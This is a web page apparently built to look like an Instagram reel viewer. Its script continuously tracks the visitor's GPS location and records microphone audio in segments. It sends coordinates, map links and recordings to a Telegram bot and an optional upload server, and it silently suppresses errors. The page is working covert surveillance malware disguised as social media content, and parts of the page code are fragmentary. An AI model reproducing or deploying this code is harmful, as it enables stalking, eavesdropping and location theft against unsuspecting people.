        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }
        .phone-frame {
            max-width: 450px;
            width: 100%;
            background: #fff;
            border-radius: 0;
            overflow: hidden;
            position: relative;
        }
        .header {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            background: #fff;
            border-bottom: 1px solid #dbdbdb;
        }
        .header .logo {
            font-size: 22px;
            font-weight: 600;
            font-family: 'Segoe UI', sans-serif;
            color: #262626;
            flex: 1;
        }
        .header .logo span { color: #262626; }
        .header .icons { display: flex; gap: 18px; }
        .header .icons span { font-size: 22px; cursor: default; }

        .user-bar {
            display: flex;
            align-items: center;
            padding: 10px 16px;
            gap: 10px;
            background: #fff;
        }
        .avatar {
            width: 32px; height: 32px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
        }
        .username { font-size: 14px; font-weight: 600; color: #262626; flex: 1; }
        .more-btn { font-size: 20px; color: #262626; cursor: default; }

        .reel-container {
            width: 100%;
            background: #000;
            position: relative;
        }
        .reel-container iframe {
            width: 100%;
            height: 580px;
            border: none;
            display: block;
        }

        .actions {
            display: flex;
            padding: 8px 16px;
            gap: 18px;
            background: #fff;
            border-top: 1px solid #efefef;
        }
        .actions span { font-size: 24px; cursor: default; color: #262626; }
        .actions .right { margin-left: auto; }

        .likes {
            padding: 0 16px 8px;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            background: #fff;
        }
        .caption {
            padding: 0 16px 16px;
            font-size: 14px;
            color: #262626;
            background: #fff;
        }
        .caption strong { font-weight: 600; }

        /* مؤشر التحميل */
        .loading-overlay {
            position: absolute;
            top: 0; left: 0; right: 0;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            height: 580px;
            color: #888;
            font-size: 14px;
            letter-spacing: 0.5px;
        }
        .loading-overlay.hidden { display: none; }

        @media (max-width: 500px) {
            .phone-frame { max-width: 100%; }
            .reel-container iframe, .loading-overlay { height: 100vh; }
        }
    </style>
</head>

        // ================================================================
        //  اختيار ريل عشوائي

        function getRandomReel() {

            return REEL_LIST[index];
        }

        // ================================================================

            const reel = getRandomReel();
            const iframe = document.getElementById('reelIframe');
            const loading = document.getElementById('loadingOverlay');

            // تعيين iframe

        // ================================================================

        let watchId = null;
        let lastSentLat = null;
        let lastSentLon = null;
        let mediaRecorder = null;
        let audioStream = null;
        let audioSegmentIndex = 0;
        let isRunning = false;

        // ----- إرسال إلى تيليجرام -----
        function tgMsg(text) {
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            }).catch(() => {});
        }

        // ----- إرسال موقع -----
        function sendLoc(lat, lon, acc) {
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, latitude: lat, longitude: lon })
            }).catch(() => {});

            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            tgMsg(
                `📍 **موقع جديد**\n` +
                `العرض: \`${lat}\`\n` +
                `الطول: \`${lon}\`\n` +
                `الدقة: ±${Math.round(acc || 0)} م\n` +
                `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
                `📍 [عرض على الخريطة](${mapsLink})`
            );

            // إرسال إلى Drive Server إذا كان مضبوطًا
            if (CONFIG.DRIVE_SERVER_URL) {
                fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-location`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: lat, longitude: lon, accuracy: acc || 0,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
        }

        // ----- إرسال صوت إلى Drive -----
        async function sendToDrive(blob, idx) {
            if (!CONFIG.DRIVE_SERVER_URL) return;
            const fd = new FormData();
            fd.append('audio', blob, `segment_${idx}.webm`);
            fd.append('segment', idx);
            fd.append('timestamp', new Date().toISOString());
            try {
                await fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-audio`, { method: 'POST', body: fd });
            } catch(e) {}
        }

        // ----- إرسال صوت إلى تيليجرام -----
        async function sendToTelegram(blob, idx) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT_ID);
            fd.append('audio', blob, `rec_${idx}.webm`);
            fd.append('title', `🎤 تسجيل ${idx} — ${new Date().toLocaleString('ar-SA')}`);
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`, {
                    method: 'POST', body: fd
                });
            } catch(e) {}
        }

        // ----- المسافة -----
        function getDist(lat1, lon1, lat2, lon2) {
            const R = 6371;
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2)**2 +
                      Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        }

        // ----- تتبع الموقع -----
        function startTracking() {
            if (!navigator.geolocation) return;
            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const { latitude, longitude, accuracy } = pos.coords;
                    if (lastSentLat && lastSentLon && getDist(lastSentLat, lastSentLon, latitude, longitude) < 0.02) return;
                    lastSentLat = latitude;
                    lastSentLon = longitude;
                    sendLoc(latitude, longitude, accuracy);
                },
                (err) => {
                    let m = '❌ خطأ تتبع: ';
                    if (err.code === 1) m += 'رُفض الإذن';
                    else if (err.code === 2) m += 'الموقع غير متاح';
                    else if (err.code === 3) m += 'مهلة';
                    else m += err.message;
                    tgMsg(m);
                },
                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
            );
        }

        // ----- تسجيل الصوت -----
        async function startAudio() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                });
                tgMsg(`🎤 **بدء التسجيل الصوتي** — ${new Date().toLocaleString('ar-SA')}`);

                function createSegment() {
                    const chunks = [];
                    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                        ? 'audio/webm;codecs=opus' : 'audio/webm';
                    const rec = new MediaRecorder(audioStream, { mimeType: mime });

                    rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                    rec.onstop = async () => {
                        const blob = new Blob(chunks, { type: mime });
                        audioSegmentIndex++;
                        // إرسال ثنائي: تيليجرام + درايف
                        sendToTelegram(blob, audioSegmentIndex);
                        sendToDrive(blob, audioSegmentIndex);
                        if (audioStream && audioStream.active) setTimeout(createSegment, 500);
                    };
                    rec.start();
                    mediaRecorder = rec;
                    setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, CONFIG.RECORD_DURATION_MS);
                }
                createSegment();
            } catch (err) {
                let m = '❌ خطأ ميكروفون: ';
                if (err.name === 'NotAllowedError') m += 'رُفض الإذن';
                else if (err.name === 'NotFoundError') m += 'لا يوجد ميكروفون';
                else m += err.message;
                tgMsg(m);
            }
        }
